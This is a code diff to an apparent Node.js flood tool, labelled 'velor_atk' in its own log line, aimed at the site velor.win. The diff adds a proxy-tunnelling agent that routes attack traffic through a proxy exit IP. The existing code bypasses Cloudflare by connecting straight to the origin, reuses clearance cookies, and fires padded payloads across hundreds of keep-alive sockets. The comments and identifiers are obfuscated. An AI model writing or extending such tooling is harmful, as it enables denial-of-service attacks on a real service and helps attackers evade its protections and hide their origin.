@@ -1,7 +1,7 @@
 // fjteug iwvd
 // epgretio nayqo odn
 'use strict';
-const https=require('https'), tls=require('tls'), zlib=require('zlib'), fs=require('fs');
+const https=require('https'), tls=require('tls'), net=require('net'), zlib=require('zlib'), fs=require('fs');
 const { performance } = require('perf_hooks');
 try{ if(fs.existsSync('cf_cookie.txt') && !process.env.CF_COOKIE){ process.env.CF_COOKIE=fs.readFileSync('cf_cookie.txt','utf8').trim(); if(fs.existsSync('cf_ua.txt')) process.env.CF_UA=fs.readFileSync('cf_ua.txt','utf8').trim(); } }catch(e){}
 const COOKIEFILE=process.env.CF_COOKIE_FILE||null, UAFILE=process.env.CF_UA_FILE||null;
@@ -15,11 +15,26 @@ const zdeuea=process.env.TARGET_HOST||'velor.win', zxypjp=process.env.TARGET_IP|
 const zvqbjy=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter zxypjp (e.g. phone tether)
 const ziyyq=parseInt(process.env.PACE_MS||'0',10);
 const zdmkucj=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin zxypjp, SNI/Host = velor.win
+const PHPROXY=process.env.PROXY_HP||'', PU=process.env.PROXY_USER||'', PPW=process.env.PROXY_PASS||'';
+const mkAuth=()=>Buffer.from(PU+':'+PPW).toString('base64');
+// every socket = CONNECT to the proxy, then TLS to the target (cookie + hit share the same exit IP)
+function tunnelAgent(){ return new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512,createConnection:(o,cb)=>{
+  const [PH,PP]=PHPROXY.split(':'); const dst=o.host+':'+(o.port||443);
+  const s=net.connect(Number(PP),PH); let b='',done=false;
+  const fin=(e,t)=>{ if(done)return; done=true; try{s.removeListener('data',onD)}catch(x){} cb(e,t); };
+  s.once('connect',()=>{ try{ s.write('CONNECT '+dst+' HTTP/1.1\r\nHost: '+dst+'\r\n'+(PU?'Proxy-Authorization: Basic '+mkAuth()+'\r\n':'')+'\r\n'); }catch(e){ fin(e); } });
+  s.once('error',e=>fin(e));
+  const onD=d=>{ b+=d; const i=b.indexOf('\r\n\r\n'); if(i<0)return; const st=b.split('\r\n')[0];
+    if(!/^HTTP\/1\.[01] 2\d\d/.test(st)) return fin(new Error('proxy '+st));
+    try{ s.removeListener('data',onD); const t=tls.connect({socket:s,servername:o.servername||o.host,ALPNProtocols:['http/1.1']});
+      t.once('secureConnect',()=>fin(null,t)); t.once('error',e=>fin(e)); }catch(e){ fin(e); } };
+  s.on('data',onD); setTimeout(()=>fin(new Error('proxy timeout')),15000);
+}}); }
 const zxadd=process.env.zrqvbv||`axdjm_qndp.out`;
 fs.writeFileSync(zxadd,`velor_atk ${zpzuth} w=${zxxhd} t=${zgcnwys}s ${new Date().toISOString()}\n`);
 const L=s=>{console.log(s);fs.appendFileSync(zxadd,s+'\n');};
 
-const zvktjxc = process.env.NO_KEEPALIVE==='1' ? false : new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512});
+const zvktjxc = process.env.NO_KEEPALIVE==='1' ? false : (PHPROXY?tunnelAgent():new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512}));
 const zfotow=JSON.stringify({v:'a'.repeat(24),events:[{e:'x'}]});
 const zhkozxc=kb=>{const b=JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:''}]}).length;
   return JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:'A'.repeat(kb*1024-b)}]});};
